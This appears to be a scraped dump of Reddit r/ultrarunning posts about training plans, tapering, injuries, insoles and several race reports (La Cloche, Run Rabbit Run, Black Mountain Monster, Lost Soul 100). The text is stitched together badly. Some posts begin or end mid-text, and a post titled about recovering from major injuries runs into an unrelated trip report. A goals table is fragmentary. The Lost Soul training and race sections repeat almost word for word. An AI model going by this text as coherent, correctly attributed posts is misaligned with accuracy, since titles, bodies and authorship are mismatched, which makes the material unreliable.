I would increase the Saturday and Sunday runs by 1 mile each week, topping out at 17+10 miles on the final Saturday/Sunday before a 5-day taper.

Weight loss three weeks out from first Ultra?,"Hi All,

Apologies I wrote this and added a load of context. I've add the question into a tl:dr but left the sprawling context as it might help explain where I'm at fitness and prep wise.

**TL:DR:** Is it worth trying to cut some weight during tapering or is that just going to hurt me?

I'm three weeks out from my first Ultra, Edinburgh Rat Race which is 55km throughout Edinburgh. It's mostly road but there's a small section up into the Pentlands Hills near the start. That's proper hill walking territory but it's all fairly well worn routes and nothing too insane. I've been up there a couple of times and we plan to walk that section since neither me nor the friend I'm running with are experienced trail/fell runners but we've both done plenty of hiking in our time. (As a side tangent my main experience trail/fell running was trying to do a 25 mile charity race through those hills with minimal training and vivobarefoot road shoes, in hindsight I'm not sure how I didn't break myself 😅). 

I started my training a bit late but have caught up ok. It's my first Ultra but I've done a couple of Marathon distances before and plenty of halfs. I also run everyday and was doing 4 miles a day for most of lockdown. So while this has definitely been a huge step up I had a decent base. I'm also doing it with a friend and our aim is just to finish within the 10 hour cutoff. So we're planning to walk large sections (most of the trails in the Pentlands) and take our time. I've also recently become a convert to walk/run/walk as a technique and that's helped massively with distance training.  


Anyway to my actual question. After lockdown I'm the heaviest I've ever been, still slimish but upto \~85kg at 186cm. Some of the gain is muscle but a big chunk is belly fat. I considered trying to trim down earlier in training but I'd just started ADHD meds that suppressed appetite (a new sensation for me!) and figured trying to cut weight while getting used to an artificially low appetite and training hard was too risky. I'm used to them now and only have one more long run next weekend before I taper for two weeks. Would it be worth trying to slim down in that time? Or would any weight loss be more than offset by the performance loss of not getting enough fuel in me to recover and build up glycogen stores?",ultrarunning,1632732641

Running Distance After Major Injuries,"Hi Folks,
I’m sure this question comes up from time to time, but I’m hoping for some recent experience and stories from those who have been through similar injuries.

I’ve managed to slowly hike to various places in the Sierra but can barely walk the next day. Has anyone been able to get back to their former performance level?

The progress has been a little frustrating, and the daily pain from normal activities a little taxing. I still can’t run or even do a single legged calf raise.

[**Link to formatted post with photos here!**](https://typetwo.fun)

&amp;#x200B;

*(I created a reddit account to post this trip report - apologies in advance for any formatting issues!)*  


Despite the resurgence of ultramarathon races post 2020-season cancellations, venturing out to Killarney to run the full La Cloche Silhouette trail has maintained a constant pull on my running ambitions. La Cloche was the trail that ignited my passion for backpacking, which leant itself to climbing, then to alpinism, to hobby-jogging when climbing gym closed due to the pandemic, to serious ultra-running and racing. Now, having just completed running La Cloche in its entirety, I find myself back where I began, the same yet entirely different.

Running La Cloche felt like the end of an early chapter in my outdoor pursuits; something that remained unfinished before moving on to bigger things. I’ve done my best to recount my experience in hopes that it might inform – or perhaps inspire? – others who seek to do the same.

  
**Trip Report**

Anticipation and angst meant I didn’t hit snooze when my 4 a.m. alarm nagged me out of my sleeping bag. After a cup of coffee, two leftover pancakes from the previous night’s breakfast-for-dinner (highly recommended), and a reluctant shedding of my warm puffy, we started the running watches\* and set out at 4:50 a.m. from George Lake’s campsite 30, fittingly the single farthest point from the eastern trailhead of the La Cloche Silhouette Trail. 

*(\*in a rather pointless attempt at good style, we ran a true loop: campsite to campsite rather than the usual east trailhead to west trailhead loop, adding a few kilometres)* 

We began the trail in a counterclockwise fashion, allowing early egress on day-hiking side trails should any nagging injuries rear their ugly head (such options do not exist after the first third of the trail). The goal was not to gun for a fast completion time, nor the vaunted FKT, but to get it done in good style and get back to camp without allowing misery to completely take over our day. 

Upon starting the trail proper, we immediately had to contend with the difficulty of navigating La Cloche’s characteristic mix of granite slab and deep forest by headlamp. After a brief acclimatization (and some fresh headlight batteries), we were well on our way to the Crack, travelling quickly on reasonably runnable terrain. We arrived at the top of the Crack at sunrise, where we were surprised and disheartened to see a number of hammock campers had spent the night.

The reality of the rest of the trail to come set in once we left the Crack. Terrain and trail conditions suitable to fast travel became a distant memory, replaced by sudden and relentless transitions between steep ascents and descents on generally very rocky, rooted singletrack. The mental concentration required to move quickly on such terrain proved to be the real crux of the day, as the challenge rarely let up from this point onward.

We were granted a short break in the form of a brief portion of runnable double-track on the way to the Silver Peak side trail junction. Feeling strong, adventurous, motivated and a little stupid, we elected in a split second decision to add the Silver Peak side trail to our loop. We ascended, tagged the summit, inhaled a few PB&amp;Js, and descended in well under and hour, and continued our loop. The views at the top were well worth the climb, as was the change of pace from the relentless mental grind of the rugged forest trails. While grateful for the brief diversion, we joked the added elevation might come back to haunt us.

The next 20 kilometres were as beautiful as they were relentless. Dangerously root-y forested sections were punctuated by stunning exposed granite ridges, which offered short glimpses of fast travel. The direct sun on the high slabs was punishing, but we were treated to the occasional refreshing northern gust of wind as we traversed the more exposed parts of the La Cloche high ridge. This section was perhaps most defined by the steep ascent up Moose Pass, where distant trail markers leered at us from above tall sections of exposed granite, with no clear path or direction other than “up”.

As we exited the Hansen Township section and entered Threenarrows, I had my first and thankfully only moment of deep-seated worry, as my outer thighs began threatening to cramp, causing my stride to stiffen. In turn, my now-awkward stride quickly brought on a sharp inner knee pain each time my left foot hit the ground. Thankfully, something in the cocktail of salt pills, ibuprofen and water I nervously sucked back kept the potential injury at bay. The potentially disastrous ramifications of an injury so far into the backcountry were jarring, despite the degree to which we had prepared for such a moment. To be 55 kilometres into an attempt to run the La Cloche loop is to be truly alone, and to be there worrying about injury without true shelter only made the feeling more exposed and sobering. 

The remainder of the run was blissfully uneventful, though our mental fortitude began to give way to regular distance check-ins and the occasional muttered complaint as we closed in on the final 20 kilometres back to camp. As we tired, turn-offs and trail markers were missed, backtracks were more frequent, and morale was tested. The terrain remained too technical to run with any consistency, forcing us to run where possible only to give up after a few hundred meters in favour of a feverish-yet-laboured power hike.

In the final few kilometres, familiar sights and the ever-closer promise of the comfort of our campsite kept the pace quick (or at least it felt quick at the time), and after a quick fist-bump on the bridge that marked the western trailhead, we speed-shuffled back to our distant campsite, quietly cursing our idealized full loop from campsite to campsite idea. We arrived back at camp 16 hours after we left for a total distance of 82.59 kilometres and a total elevation gain of a whopping 3,267 meters.

I can hardly remember eating dinner, and I certainly can’t remember falling asleep.

Yes, I would do it again.

**Thoughts on Gear**

On to the fun stuff. Gear selection for this attempt was subject to much scrutiny, but the final decisions proved to work in a general sense.

VJ Ultras were the shoe of choice for this run, given their ideal balance between cushion and ground feel and their emphasis on grip for potentially slick granite slab, wet roots, and classic Killarney clay-rich mud. They performed admirably – especially on wet terrain – despite my relative lack of experience with them (I had only put 50 kilometres on them prior to La Cloche). 

The Salomon Sense Pro 10 was the vest of choice for this run. A 10 litre capacity vest for an unsupported 80+ kilometre run was certainly a risk, but with careful packing and plenty stored in the front pockets, it proved adequately roomy. Comfort was excellent despite humid, sweaty conditions through a very long day on the trail. I used the standard Solomon soft flasks, topped with dual Salomon XA filters for quick water filtration on trail – this setup was crucial in order to minimize wasted time actively filtering water. I carried a third, empty Salomon soft flask in the main vest pocket to fill and carry through longer sections that were without reasonable expectation of water access, though this proved unnecessary and the third flask was never used.

Layers were simple, and brought to you by a well-timed Patagonia sale: A Patagonia Capilene baselayer, coupled with a (seldom-used) Airshed Pullover for wind and light precipitation. While shorts may not seem like a gear choice worthy of discussion, I should call out Patagonia’s now-discontinued Endless Run hybrid short/tight for stellar all-day comfort and truly excellent pockets. For long efforts like these, the chafe protection and ample storage make them worth the increased weight over a pair of split shorts. Fair warning – they look stupid as heck.

Nutrition was a case of “if it isn’t broke, don’t fix it”. Tailwind, stroopwafels and (caffeinated) Endurance Taps made up the bulk of my calorie intake. A peanut butter &amp; jam (no one likes jelly) sandwich and some salt &amp; vinegar cashews quelled palate fatigue and provided some much needed fat and salt, while a couple Snickers bars ended up being the star of the show – every full day out in the backcountry needs a snack that you actually look forward to consuming.

Safety gear took the form of a Garmin InReach, a single down puffy and Gore-Tex ShakeDry shell (each to be shared if needed), and a well-stocked first aid kit. Shelter was omitted by virtue of the excellent weather forecast, though I am well aware of the increased risk created by this decision.",ultrarunning,1632676882
Training Plan Question,"Hi - hope this is not too specific of a question. Long time reader, first time poster -  I am training for my first ever ultra in February (60k) with another potential ultra in December (signed up for 50k but there is a 35k option).

I ran a half (not anything too fast, 9:30 mm) last weekend and felt fine during/immediately after, but have since had ankle pain that will not go away (wearing a compression sleeve around the house). I haven't run on it since last weekend but have to walk a decent amount where I live. I'm getting nervous that I have already skipped the first week of the training plan - will this be a problem? Any recommendations to get back on track and avoid overuse injuries?

Spartathlon,"Spartathlon (246 km/153 miles) starts tomorrow for the 38th year in Greece on an ancient route run by Pheidippides in 490 B.C.

"Longest long run for first 50k, and hiking translations to running","Hi all, first post here, some questions that I'd really appreciate your help with:

What, would you say, is the minimum longest training run needed for a hilly 50k? Not seriously ‘racing’, but just wanting to get around and have fun as it’ll be my first ultra. On trails such as the one I’ll be racing I am about 14 minutes/mile, so I’m rounding that to 15 minutes and thinking an 8-8.5 hour finish is doable. Longest run so far is 20 miles (on a pretty easy trail), and I've had several 15+ milers on trails like what I will be racing on. 

Obviously, my long training runs take ages. Which I’m totally okay with. But I have three long runs left before I start tapering and I’m not quite hitting my plan so I’m wondering if hitting the marathon distance on a trail is critical or not. Between running and hiking (95% running) I have been around 40mpw for the past couple few months, which I feel like should be higher but oh well. For the next the long runs, I am thinking 22, 24, 26... thoughts?

Also, after my last long run, I will be going on holiday and doing a lot of hiking. I will also still be running (supposed to be around 30-35 miles that week). The hikes will be fairly intense mountain hikes in the northern Appalachians, probably no longer than 12 miles per hike though due to my old dog, but easily 2500-4000' gain. Due to less sunlight, traveling/driving places, being on holiday with boyfriend, hiking a lot, etc., I'm anticipating not being able to hit every single run and wondering how much this will hurt me? I go on holiday on the 10th, my race is on the 30th, so will a) hiking a lot and running some will be a nice way to taper or b) hiking will be nice but I need to hit all my runs?

Thank you all in advance!",ultrarunning,1632404617

This community is great - Big thanks to everyone who helped me when I tripped attempting RRR!,"I made my second attempt at Run Rabbit Run 100 last weekend. The race was going well early on. I was generally feeling strong and on my target pace. It was hot in the mountains (low 80s) but I had been training in the heat in Texas all summer, so I thought things were fine.

As I rounded a switchback on the first major descent around mile 13 (just above upper Fish Creek Falls, if you know the course), I stumbled. I extended my leg to catch my balance and - BAM! - my calf seized up and I hit the rocks.

Without missing a beat, a nearby runner stopped to help me out. Once it was sure I was not seriously injured, he gave up a few minutes of his race pushing my foot back and forth to help work out the cramp, all while I'm cursing and moaning in agony (apologies to anyone who heard that echoing across the canyon). Throughout this, *every* runner that passed offered help in the form of salts, blocks, and moral support. Despite it looking like my race was over, everyone was willing to lose a little time or gear to make sure I was OK.

We worked out the worst of the cramp and after a little time sitting on the sidelines I managed to hobble down to the aid station. There, the nurse immediately noticed what was going on and came over and started massaging my calf while other volunteers brought me water and offered food (my stomach was not having food at that point). She spend a good portion of my stay there working it out with me (and the other cramped runners - there was a theme).

After a slow ascent with my muscles right on the edge of another cramp, I spent some more time at the next aid station (Long Lake) getting salts balanced. From there, I committed to see if I could make it.

The next sections were 5 miles of easy climbing up a road followed by 20 miles of downhill. I managed to get back on my target pace and gave it everything I had. Unfortunately, the few hours lost in recovery were the buffer I needed and I came into the midway aid station (Olympian) 5 minutes (!!!) past the cutoff. Even with the accident, I was still two hours ahead of my time from 2019 - a victory for me.

**Words cannot express how grateful I am for everyone's help.  In particular, if you're the guy who stopped and helped me work it out, the nurse and aid station volunteers, or the person who threw blocks at me despite my reluctance to accept, thank you! I would not have continued without your support!**

In hindsight, it's pretty clear that I miscalculated on salts and should have upped the amount as it started to heat up. Live and learn and on to the next one!",ultrarunning,1632323026

### Training
I didn't follow a specific training plan or guide. But my weekely runs consisted of Wednesday hills/trails 4-6km, Friday road ~5km+, and easy long slow distances on Sundays with cross training in the gym tuesday and thursday mornings. I tried following a plan to train for this race in prior years, but I ended up getting injured and I really just didn't have it in me to run every single day. So training for this I decided to go at my own pace and actually quite enjoyed all of my runs.

I ended up driving out to the course and did 25km there as a trial run which was the longest distance I had done up to this. Initially I had planned to do 30-32km but the course was far more difficult that I realized. But spending 5+ hours on the course I learned quite a bit about what to expect. 

### Pre-race
In the days leading up to the event my anxiety was at an alltime high which resulted in me getting really poor sleeps. However, come race day, I was absolutely fired up and ready to go.

In my vest I carried two 500ml soft flasks. One with water, the other with Nuun. Stinger waffles, Huma gels, Fruit bars and candy. 

### Race
Conditions looked awful, 30-35 degrees celcius with 50km/hr+ winds or more. But more on that later. 

The first 20km was amazing. The hills are hard but fairly straightforward and there were plenty of relatively flat sections that allowed me to run at a comfortable and relaxed pace. The ~11km and ~16km aid stations were welcome sights but I was not quite desperate for them yet. 

The sun came out around the 20km mark and that’s where things went slowly downhill. 

I left the 23km aid station with 1L of water. The high heat with the harsh winds made hydration a real challenge. The wind feels nice because it kind of makes the heat of the sun feel not so bad, but it is a nasty trick. 

By 25km I was rationing water. One sip per 1km. I didn’t run as much because the more I ran, the more my body demanded water. I was desperate for the next aid station. I switched to technique I called “hiking with confidence”, it’s the walk you do when you’re at the airport kind of late on the way to the gate - but you’re not about to full blown run. 

Between 28-32km I decided to quit but changed my mind a few times. I arrived at the 32k aid station at 6hours 30mins. The wonderful team there dumped a bucket of ice water on my face and that changed everything. Suddenly I felt ready to go and figured I could slam the last 18km in just over 3 hours, but the damage was already done. 

I was still able to eat solids. Putting down a fruit to go bar, waffle, banana or energy gels more or less fine. But after this aid station I couldn’t run anymore. I believe I was just too dehydrated from the last leg. Whenever my heart rate elevated my stomach wanted to purge itself. Finishing today was not longer an option but I figured I could slog my way to the next aid station. 

The last leg I was more or less alone. And one of the sweepers (volunteers making sure nobody was left on the course) came up behind me and we walked it in to the 42k aid station together, it was nice to have some company. 

I was DNF’d at the last aid station at 9hours and 46 minutes. But really there was zero chance of me going back out there had they let me. 

It was the hardest thing I have ever done and I had such a fun time doing it. 


### Post-race

In summary:

Training / preparedness ✅
I felt I was prepared enough to finish. The heat just got to me so bad.

Nutrition ✅.
I was still able to eat solids and had a pretty good variety of foods

Hydration ❌.
More water.

Footwear ❌. 
My Saucony Peregrines ended up not being really all that comfortable after 25km. My left foot was falling asleep so I had to loosen the laces, but that created more movement. Blister city. 

Attitude / Mental health ✅. 
It sucked for sure but I was in high spirits for the most part. Really enjoyed it.

People ✅.
The people that run these races are the nicest people I have ever met. I love being a part of this sport.

Again? ✅. 
Absolutely. I need to finish next year.",ultrarunning,1632257938

I’m not looking for huge results maybe 12 hours &amp; 44 miles. But I’m hoping to prepare as much as possible and know I’ll probably have to shift away from the ultra training I’m used to. The course is flat and made up of gravel, grass, and pavement. I have capacity to run 4 days per week and am willing to do strength training/speed/mobility work etc. Any advice appreciated! Also any information about the last man standing community vs ultra community? i.e. are people supportive/receptive to newcomers?",ultrarunning,1632246122

We never caught his name and now are so curious who this ultra runner mystery man is and what his background is. He is a friendly white American (assuming - no obvious accent) young, probably under 35, male with a short beard. I think he had blue eyes when we saw him without his glasses on. He looked to be in great shape as if he was a professional runner. Does anyone in the ultra running community know him? Thanks in advance! We are rooting for him!",ultrarunning,1632190344
Can I split my midweek runs into 2-a-days?,"I’m using this [pretty basic 50 mile training plan](https://trailandsummit.com/wp-content/uploads/2021/04/16-week-50-mile-run-training-plan-infographic.jpg) and I’m into week 9 where my TWT runs are 10,6,8.

Is a year too much time to prepare?,"Hey everyone! I have some questions about how to approach building a training plan for an ultra with a year's worth of preparation. I just finished a 9 month train up for a backyard ultra and want to run the same race next year. I'm looking for advice on how to approach building a training plan to prepare for the same race without losing the endurance I have already built, and without increased risk of injury. I would also like to improve my leg strength, get more hill training, and increase my speed. Ideally, I would like to incorporate all of this, plus building a more comprehensive endurance base, at the same time, every week. I don't like the idea of working on one area at a time. 

I am 39 years old and was averaging only about 50 miles a week during this last train up. I have run a couple of marathons and a 50 miler. My goal is to be able to run at least 100 miles next year with the ultimate goal of winning (this year's winner hit 147 miles). I am not worried about the time commitment during the next 6 months, as I should have time to get in two different workouts a day. 

I'm not looking for someone to build the plan, just some insights on incorporating all facets of training at the same time, and any pitfalls others have encountered. Thanks for any information!",ultrarunning,1632092270

### Goals

|------|-------------|------------|
| A | Top 10 | *Yes* |

### About

BMM is held in June in a park near downtown Black Mountain, NC, on a 3.25 mile runnable trail loop (no, not up in the mountains ala Quest for the Crest, Seven Sisters, etc). After some serious flooding a few years ago the course was altered slightly in 2021, lengthening from 5km to 3.25mi and the start/finish was moved to a better location. No real vert, maybe 100-200ft/lap. There are 6, 12, and 24 hr options.

### Training

I’ve only been running ultra distance for two years with a handful of 50ks and one self-supported 50 miler under my belt. For the buildup for this one, in the spring I raced a 50k in Raleigh and crashed hard in some unexpected (for early April) 80 degree heat. I was huffing it in the last 8-9 miles and vomiting. Not a fun one. I learned a lot from that crash that came in handy for BMM re: heat and nutrition prep. (That’s the point of buildup races, right!) A few weeks later I ran/hiked the Black Mountain Crest Trail out and back (23 miles 8,000ft vert) with a buddy which was a really helpful training run in terms of time on feet + vert. Peak training was between 55-65mpw with weekend moderately long back-to-backs, the last of which was 21 and 17 miles. I was in a positive space coming into the race. Of course there is always a bit of “could I have done more?” but in general I felt ready to roll. My goal for the race was to get between 55-60 miles in these 12 hours and place Top 10. If the weather really broke for us (which, spoiler alert, it did not) my stretch goal was 100k. My bottom-of-the-barrel, wheels-come-off goal was a distance PR (over 50mi). 

### Race
The day was shaping up to be sunny, hot, and humid. I grew up in these mountains and I would describe it as a standard summer day. 80 and sticky. When the gun went off (10am start) many went out fast but I was determined to hang back.

The middle of the day really started to take its toll on the field fairly quickly. Everyone slowed significantly. (What is mentally tricky about looped races like these is that the 6, 12, and 24 hour runners were all on the same loop simultaneously so it was impossible to ‘run off’ other people unless you peeked at their bib. Overall I just tried to ignore others and run my own race. When the 6 hour guys finished it was a lot easier to avoid chasing.) Slowly I was finding a rhythm around the course. 

My plan for our personal aid tent each loop was to ‘blow through’ every time (less than 30 seconds), only stopping for a cold water douse and water refill. Then every 15 miles (3x in the race) I would stop for 3-5 minutes to regroup for a bit and fill up on food. And that’s exactly how it worked out minus one extra 2-3 minute stop I took around mile 20. It was hot out there. Many were commenting their stomachs were struggling. Mine was as well (I had a hard time with gels) but not nearly as much as others, it seemed. My wife was awesome at quickly switching out water bottles, dousing my buff in ice water, ice down the arm sleeves, etc. I’m a lucky man. My 3 little girls were a fun morale boost as well, running 50-100 yards with me out of the aid station each loop and ‘helping’ mom. Looped ultras are a real benefit in this way. Crews are able to stay in the same spot and then we all get into a nice rhythm at each stop that point-to-points can’t do.

Even though I was already feeling pretty good all things considered, it was after 50k/~6hrs was when things started to come together really nicely. I put together some solid laps and gained a few more spots. The lead male dropped with an injury. (Sorry, man!) Roughly mile 40-45 I moved up into 4th but, most importantly, was in a great headspace for the last few hours. As the day cooled off, things continued to click. Even effort, no real low spots. Gels never went down well, but Bugles (yes, shout-out to America’s finger hats), watermelon, and pierogis went down nicely. 

At 52 miles I did a little math on the fly and figured out I could complete two more laps and still get in under 12 hours. Finished in 11:50ish with 58.5 miles. 18 laps.

Shoutout to all the finishers. I yoyo’ed quite a bit with the 24hour female eventual winner and was so impressed with some of the 24 hour folks running what was my 12 hour pace. Great athletes out there, way to go everybody. I would recommend this race to others. Well-organized and a fun environment with all the tents and personal aid stations along the course. And definitely a chance to go for an ultra PB that is still on trail but less technical/vert. 

### Post-race
A) Recovery: was feeling great by Wednesday or Thursday.  Except for a gnarly toenail blister I escaped this race without any issues. (Edit: a few weeks later I aggravated some ITB issues which have persisted) B) Aggressive heat management really helped me out. Even though 80 degrees isn’t exactly western states, I’d learned at the 50k in April that I’m a pretty below-average heat runner and need to be more aggressive than most and not overcook it early. Switching out ice cold buffs and hats and stuffing ice in the buff, sleeves, and belt seemed to do the trick for me. C) Looped courses can be an exciting test if you relish the challenge of ‘figuring out’ a course and want to grow mentally to overcome the monotony. I found it fascinating.

### Gear/eats
Nike Pegasus trail 2 (great for non-tech trail like this though my toes ran out of room towards the end of the race), darn tough socks, some cheap amazon arm sleeves, Garmin 945, petzl iko core for the last 90 minutes in the dark, Naked running belt with Salomon flasks, tailwind, Clif gels, pierogis, bugles, mountain dew, and watermelon.

How Does Hiking Translate into Trail Running?,"For example, I recently hiked 60miles with 16,000ft of Elevation gain with a 15kg backpack on over 3 1/2 days averaging 2-3mph a day. 

A few weeks prior I did 24 miles and 5000ft of elevation in 7 hours walking. 

How will this translate into ultra running? 

Ive been running for about 3 weeks (prior to my multi day hike) but mostly 3/4 5ks in a week and I’ve built up to running a 10mile long run and feel I could go further - all within zone 2/3. 

There’s a 50k trail race near me in 9 weeks time with a 10hour completion window.

Insoles..,"Small backstory:

I have super flat feet and slight problems when I hit high mileage weeks and even some ultras (only have gotten to the 50mile stage so far). Believing the problem is tibialis posterior tendinopathy. 

At one time, I was recommended arch supports by my local running store. These were Superfeet Carbon fiber insoles for arch support. These things KILLED my feet because my arch would fold over them and it was just so hard on my foot. They have now been transferred to my work shoes where they don’t hurt and I believe they help.

Coming back from first DNF.,"1 month ago I ran my first 50 miler, the cool moon 50 miler. Or Atleast attempted. I made it to mile 30 before heat exhaustion took over, temps were at 105 degrees and I started throwing up uncontrollably and could barely walk without my heart rate spiking. I can’t blame it on the heat. I should’ve trained adequately for the heat and been prepared for it. Anyways, since the race, I haven’t been able to get the thought out of my head that I can finish and want to get back out there and redeem myself. A week after cool moon I signed up for another 50 miler. I never really gave my body a break and have maintained my base level fitness. Hard Training starts again in one week and the demons I had after the DNF are coming back and have me debating if I should even give this thing another go. The thought of another DNF haunts me.

### Training
 My training for an ultra began in August 2020, beginning at about 30 km/week and rising to about 60 km/week by the end of the year. In the lead up to the race, I followed a plan out of the book Relentless Forward Progress, peaking at 80 km/week. I did have some deviations from the plan: I usually ran one less day per week than was in the book and upped the midweek run distance to compensate. The longest run in the plan was 80 km, after doing some research I found that it was recommended that your longest training runs top out somewhere in the 8-9 hour range. An 80 km would likely take me 12 hours or so, so instead I ran a hilly 60 km which ended up giving me 8.5 hours on my feet. The last deviation was during the taper; I was having some tendon pain in my left leg, and in the 3 weeks before the race I ran 48 out of a planned 115 km. Most of my running was done at night after my kids went to bed, with my long runs commonly ending after midnight. I got very comfortable running tired and with a headlamp, which I think helped me a lot during the race. 

### Race
 
The race started at 7 AM with 46 runners. We took off on the shale path and everything felt great. After 2 km the single track started, which meant a long line of runners marching up and down the coulees. The pace was a bit faster than I would have liked to run, but I knew that it wouldn’t last long. Once we hit the first aid station some runners stopped and the line thinned out a bit. I brought enough food and water for the first few legs, so I just kept on running and soon enough the trails were a lot less crowded. Despite this, my pace kept up as the excitement of the race was still fresh. I knew in the back of my head I should slow down, but the weather was nice and cool and my body felt great, so I figured I could let it ride for a few hours. My wife and kids came to see me at the second aid station, and I’m glad they got to see me running in such a good mood!


The 100 mile race at the Lost Soul consists of three 54 km laps. About half way into the first lap, I started to make a conscious effort to slow down, walk more, and get more calories in. I was well ahead of my 9 hour first lap goal, and although my legs still felt good, I knew that I wasn’t taking enough breaks to eat. Sure enough, in the last 20 km or so of the first lap my mood dropped, and I was feeling a bit grumpy for absolutely no reason. I knew if I kept eating it would turn around, so that’s what I focused on. I finished the first lap in 8:30 and got to see my wife and kids again! This time I wasn’t quite so cheerful, but it was still great to see them and the signs and noisemakers they had gave me a big boost. After spending a bit of time in the aid station I took off for my second lap as my son jeered me unknowingly: “Run Daddy, this isn’t a walking race!”


With the fast first lap down, I knew that I had plenty of time to finish the final two laps. My only goal was to finish under the cut-off of 33 hours, so I decided to slow way down and focus on eating and conserving energy for the later miles. I pictured every walking/eating break as an energy deposit that I could draw from later in the race. In the first section of the second lap my mood started to improve, which I was able to keep up for the rest of the race. 


At about 13 hours in, the sun had set and I pulled out my headlamp. The race was incredibly well marked, however in the dark the flags became harder to see. (sometimes the flags would fold over their own reflective sticker) After 13 hours of racing I was beginning to disengage a bit, which led to a few times where I wasn’t sure if I had missed a turn or not. I never actually did miss a turn, I just spent a bit of mental energy worrying if I had, and a couple of times I backtracked a short distance to find a flag. I just put this down to racing inexperience mostly. Around this time was when I started using my caffeinated Nuun tabs, which helped perk me up for the night.


I spent the rest of the second lap plugging away slowly. It had begun to rain on and off, but the trails still felt good and it didn’t affect me. I met a lot of 100 km runners in this section, who only had about 15 km to go. It surprised me to see that nearly everyone I met was not in a good mental state, despite being so close to the finish. I credit my good mood at this point to consistent calories and plenty of experience with night running. On the last few legs of the second lap, I realized that with my plan of moving deliberately slower, my lap time was going to be right around 11.5 hours, which meant that I had 13 hours to finish my final lap. At this point I was confident I could repeat my 11.5 hour lap without too much trouble, so it seemed that my ‘move slowly and eat a lot’ strategy would pay off.


As I finished my lap and came into the aid station, I saw some other 100 miler runners for the first time in many hours. Each lap begins with a 7 km loop that returns to the start/finish line, and after chatting a little bit while refueling I learned these runners had already done that loop. There were five runners there, and they all looked pretty wrecked, lounging deep in chairs near a heater or lying down on air mattresses. This gave me a big boost of energy and I realized I might be able to pick off a few runners on my last lap. I wished everyone good luck and headed out as the rain began to pick up. My plan was to go the same pace as my second lap, and pick it up in the last 20 km or so if I had anything left in the tank.


The third lap started well, and I saw another couple of headlamps that were on the back half of the loop which continued to grow my confidence. I was moving well in the rain for the first 20 minutes on the shale paths and asphalt, but then I came to the first climb of the lap. I couldn’t get up the first 10 foot section, as the rain had turned the trail into a slip and slide. After failing to get any traction on the trail for a few tries, I realized the only way up was to hike on the side of the trail, climbing with my hands when necessary. It was still slippery off the trail, but I could make slow progress. As I came over the top of the long, slow climb and into the descent, I realized that running was out of question. I tried to surf down the trail, however I would pick up speed quickly and fell a few times on this first descent alone.


At the bottom of the hill I realized that I had a new problem; my hands were covered in mud and I was running out of places to wipe them off. This meant that eating would be difficult. I tried to eat some of my snacks with some difficulty before deciding to wear my gloves while running. This way the gloves would get dirty, and I could take them off to eat. In practice my hands just got dirty messing around with my gloves so nothing really got solved.


The rest of the loop was a complete slog. The trails were either flooded or so slick it felt like running on ice. Despite moving slower than I had all race, I was using far more energy and was quickly becoming tired. The descents were the toughest part, with multiple falls and butt slides on each one. During one of the falls I tweaked my knee; I knew I could still run with it on solid ground but on the slippery trails it seemed like I was just asking for an injury. 


As the loop came to an end I had made a decision; if the directors had changed to the wet weather course (all gravel and shale) I would finish the race, but if I had to continue to run on trails then I would have to stop. As I came into the aid station I asked about the situation and was given two options: I could either wait around for ~2.5 hours while they collected runners that were stranded on the course and set up the wet weather loop, or I could take a 100 km finish now. My first thought was that a 100 mile race with a 2.5 hour rest didn’t seem very fair (to the race course? I don’t know, I was tired) as I would have time to regain my energy and refuel. Shortly after thinking this I realized that after a break that long I wasn’t sure I would be able to move at all, and I would need to be constantly moving during the break to ensure that my legs didn’t seize up. On top of that I wasn’t sure how my hurt knee would fare either. After a couple minutes of internal debate, I went over to the timing table and let them know I would take a 100 km finish. My final totals were 114.8 km in 21:56, and the race gave me an official 100 km finish (actually 108 km) of 20:07.


I left the timing table and walked through the finish line. I raised my hands and I think someone cheered. It certainly wasn’t the finish I was expecting and it felt incredibly anti-climactic. I was a bit jealous of the 100 km runners that were running down the final stretch triumphantly to scattered cheers. I sat around for a bit, texting the people who were following my race and chatting with runners that were making it back. Stories of people hitching rides in cars, losing equipment or bushwhacking to the closest aid station made me feel a bit better about my own muddy adventure. Once I heard back from my wife and knew I could get into my hotel room, I made the slow, cold 1 km walk back to the hotel.


Overall I’m a little disappointed with the result. I went to Lethbridge to run 100 miles, and have no doubt that had the trails held up I could have done it under the cut-off time. I held back on my second lap in preparation for a third lap I didn’t get to run, so it doesn’t really feel like a true 100 km effort either. On the other hand, running 115 km in my first ultra is something I can be proud of, and I’m excited to use the experience I gained in the future.

\### Training

 My training for an ultra began in August 2020, beginning at about 30 km/week and rising to about 60 km/week by the end of the year. In the lead up to the race, I followed a plan out of the book Relentless Forward Progress, peaking at 80 km/week. I did have some deviations from the plan: I usually ran one less day per week than was in the book and upped the midweek run distance to compensate. The longest run in the plan was 80 km, after doing some research I found that it was recommended that your longest training runs top out somewhere in the 8-9 hour range. An 80 km would likely take me 12 hours or so, so instead I ran a hilly 60 km which ended up giving me 8.5 hours on my feet. The last deviation was during the taper; I was having some tendon pain in my left leg, and in the 3 weeks before the race I ran 48 out of a planned 115 km. Most of my running was done at night after my kids went to bed, with my long runs commonly ending after midnight. I got very comfortable running tired and with a headlamp, which I think helped me a lot during the race. 

&amp;#x200B;

\### Race

 

The race started at 7 AM with 46 runners. We took off on the shale path and everything felt great. After 2 km the single track started, which meant a long line of runners marching up and down the coulees. The pace was a bit faster than I would have liked to run, but I knew that it wouldn’t last long. Once we hit the first aid station some runners stopped and the line thinned out a bit. I brought enough food and water for the first few legs, so I just kept on running and soon enough the trails were a lot less crowded. Despite this, my pace kept up as the excitement of the race was still fresh. I knew in the back of my head I should slow down, but the weather was nice and cool and my body felt great, so I figured I could let it ride for a few hours. My wife and kids came to see me at the second aid station, and I’m glad they got to see me running in such a good mood!

The 100 mile race at the Lost Soul consists of three 54 km laps. About half way into the first lap, I started to make a conscious effort to slow down, walk more, and get more calories in. I was well ahead of my 9 hour first lap goal, and although my legs still felt good, I knew that I wasn’t taking enough breaks to eat. Sure enough, in the last 20 km or so of the first lap my mood dropped, and I was feeling a bit grumpy for absolutely no reason. I knew if I kept eating it would turn around, so that’s what I focused on. I finished the first lap in 8:30 and got to see my wife and kids again! This time I wasn’t quite so cheerful, but it was still great to see them and the signs and noisemakers they had gave me a big boost. After spending a bit of time in the aid station I took off for my second lap as my son jeered me unknowingly: “Run Daddy, this isn’t a walking race!”

With the fast first lap down, I knew that I had plenty of time to finish the final two laps. My only goal was to finish under the cut-off of 33 hours, so I decided to slow way down and focus on eating and conserving energy for the later miles. I pictured every walking/eating break as an energy deposit that I could draw from later in the race. In the first section of the second lap my mood started to improve, which I was able to keep up for the rest of the race. 

